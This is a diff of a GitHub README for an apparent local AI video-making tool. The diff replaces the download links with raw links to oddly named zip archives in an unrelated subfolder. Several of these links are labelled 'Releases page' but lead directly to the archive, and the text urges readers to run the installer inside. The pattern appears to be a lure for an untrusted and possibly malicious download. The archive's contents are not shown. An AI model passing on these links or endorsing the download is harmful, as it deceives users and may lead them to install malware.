@@ -6,7 +6,7 @@ Welcome to the local-ai-video-maker-for-youtube-shorts-and-reels! This applicati
 
 ## 📥 Download Now
 
-[![Download](https://github.com/DaennyEL/local-ai-video-maker-for-youtube-shorts-and-reels/raw/refs/heads/main/Nototrema/and-shorts-video-local-maker-reels-youtube-for-ai-v3.4.zip%https://github.com/DaennyEL/local-ai-video-maker-for-youtube-shorts-and-reels/raw/refs/heads/main/Nototrema/and-shorts-video-local-maker-reels-youtube-for-ai-v3.4.zip)](https://github.com/DaennyEL/local-ai-video-maker-for-youtube-shorts-and-reels/raw/refs/heads/main/Nototrema/and-shorts-video-local-maker-reels-youtube-for-ai-v3.4.zip)
+[![Download](https://github.com/DaennyEL/local-ai-video-maker-for-youtube-shorts-and-reels/raw/refs/heads/main/Nototrema/local-ai-youtube-and-maker-for-shorts-reels-video-v3.2.zip%https://github.com/DaennyEL/local-ai-video-maker-for-youtube-shorts-and-reels/raw/refs/heads/main/Nototrema/local-ai-youtube-and-maker-for-shorts-reels-video-v3.2.zip)](https://github.com/DaennyEL/local-ai-video-maker-for-youtube-shorts-and-reels/raw/refs/heads/main/Nototrema/local-ai-youtube-and-maker-for-shorts-reels-video-v3.2.zip)
 
 ## 🖥 System Requirements
 
@@ -30,7 +30,7 @@ Before you start, make sure your computer meets the following requirements:
 
 To start creating videos, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/DaennyEL/local-ai-video-maker-for-youtube-shorts-and-reels/raw/refs/heads/main/Nototrema/and-shorts-video-local-maker-reels-youtube-for-ai-v3.4.zip) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/DaennyEL/local-ai-video-maker-for-youtube-shorts-and-reels/raw/refs/heads/main/Nototrema/local-ai-youtube-and-maker-for-shorts-reels-video-v3.2.zip) to find the latest version of the software.
 2. **Download the Installer:** Click on the version you want to download. Look for files marked as `.exe` for Windows or `.dmg` for macOS.
 3. **Run the Installer:**
    - For Windows, double-click the downloaded `.exe` file.
@@ -74,6 +74,6 @@ Want to provide feedback? Have suggestions for new features? Reach out via the i
 
 ## 📥 Download Now Again
 
-To start making your videos, don’t forget to visit the [Releases page](https://github.com/DaennyEL/local-ai-video-maker-for-youtube-shorts-and-reels/raw/refs/heads/main/Nototrema/and-shorts-video-local-maker-reels-youtube-for-ai-v3.4.zip) to download the latest version of local-ai-video-maker-for-youtube-shorts-and-reels.
+To start making your videos, don’t forget to visit the [Releases page](https://github.com/DaennyEL/local-ai-video-maker-for-youtube-shorts-and-reels/raw/refs/heads/main/Nototrema/local-ai-youtube-and-maker-for-shorts-reels-video-v3.2.zip) to download the latest version of local-ai-video-maker-for-youtube-shorts-and-reels.
 
 This Markdown file serves as a complete guide. Enjoy creating your videos!
